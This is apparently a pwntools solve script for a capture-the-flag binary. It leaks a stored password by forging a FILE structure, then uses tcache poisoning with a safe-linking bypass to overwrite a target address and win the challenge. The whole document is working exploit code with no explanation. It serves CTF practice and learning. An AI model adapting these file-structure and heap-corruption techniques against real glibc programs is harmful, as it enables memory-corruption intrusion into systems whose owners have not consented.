from pwn import *

elf = context.binary = ELF('./chall_dist_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
context.log_level = 'debug'
context.terminal = 'kitty'

p = process('./chall_dist_patched')

fp = FileStructure()
fp._IO_read_ptr = elf.sym.password
fp._IO_read_end = elf.sym.password + 16
fp._IO_read_base = elf.sym.password
print(fp)
payload = fp.struntil('_IO_write_base')

p.sendlineafter('>', payload)
p.recvuntil('tmpfile: ')
password = p.recvline().strip(b'\n')
log.info(password)

p.sendlineafter('>', password)

p.recvuntil('Prove it to me at ')
doyoupwn = int(p.recvline().decode().strip(), 16)
log.info('doyoupwn, %#x', doyoupwn)

def malloc(index):
    p.sendlineafter('>', '1 {}'.format(index).encode())
    p.recvuntil('Chunk {}: '.format(index))
    return int(p.recvline().decode().strip('\n'), 16)

def free(index):
    p.sendlineafter('>', '2 {}'.format(index).encode())

def write(index, data: bytes):
    p.sendlineafter('>', '3 {}'.format(index).encode())
    p.sendline(data)

chunk = malloc(0)
malloc(1)
free(1)
free(0)
write(0, pack((chunk >> 12) ^ doyoupwn))
p.sendlineafter('>', '1 3')
p.sendlineafter('>', '1 4')
write(4, 'Yes I do!\0')

p.interactive()
